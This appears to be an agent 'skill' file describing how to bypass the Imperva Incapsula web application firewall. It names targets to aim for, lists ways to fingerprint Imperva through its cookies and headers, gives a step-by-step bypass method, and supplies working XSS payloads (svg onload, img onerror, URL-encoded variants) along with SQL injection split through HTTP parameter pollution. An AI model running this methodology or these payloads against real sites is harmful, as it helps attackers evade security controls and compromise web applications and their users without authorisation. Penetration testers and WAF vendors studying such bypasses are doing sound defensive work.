---
name: waf-bypass-imperva
description: Skill for bypassing Imperva Incapsula WAF using XSS encoding, SQLi parameter pollution, and known bypass patterns from the Awesome-WAF knowledge base.
sources: github
report_count: 15
---

# Imperva Incapsula WAF Bypass

## Crown Jewel Targets

- Endpoints behind Imperva without custom rules
- API endpoints with relaxed security
- Responses with `X-Iinfo` header present

## Attack Surface Signals

- `visid_incap_` cookie confirms Imperva presence
- `incap_ses_` session cookie
- `X-Iinfo` header in responses
- "Powered By Incapsula" in block pages

## Step-by-Step Methodology

1. Confirm Imperva presence: check for `visid_incap_` or `incap_ses_` cookies
2. Test standard XSS against Imperva
3. Try event handler-based XSS (onload, ontoggle, onfocus)
4. Test parameter pollution to split payloads across parameters
5. Test encoding variations
6. Test SQLi with HPP splitting
7. Test mixed encoding types

## Payloads

```html
<!-- Event handler XSS - often bypasses Imperva -->
<svg onload=alert(1)>
<body onload=alert(1)>
<img src=x onerror=alert(1)>

<!-- Encoding-based -->
%3Csvg%20onload=alert(1)%3E

<!-- Parameter pollution for SQLi -->
?id=1&id=UNION&id=SELECT&id=1,2,3--
```

## Common Root Causes

- Imperva's signature-based detection misses obfuscated payloads
- Event handler diversity creates coverage gaps
- Parameter pollution splitting evades single-parameter inspection
- Mixed encoding confuses normalization routines

## Gate 0 Validation

- [ ] Have I confirmed Imperva presence?
- [ ] Have I tried event handler XSS?
- [ ] Have I tried parameter pollution?
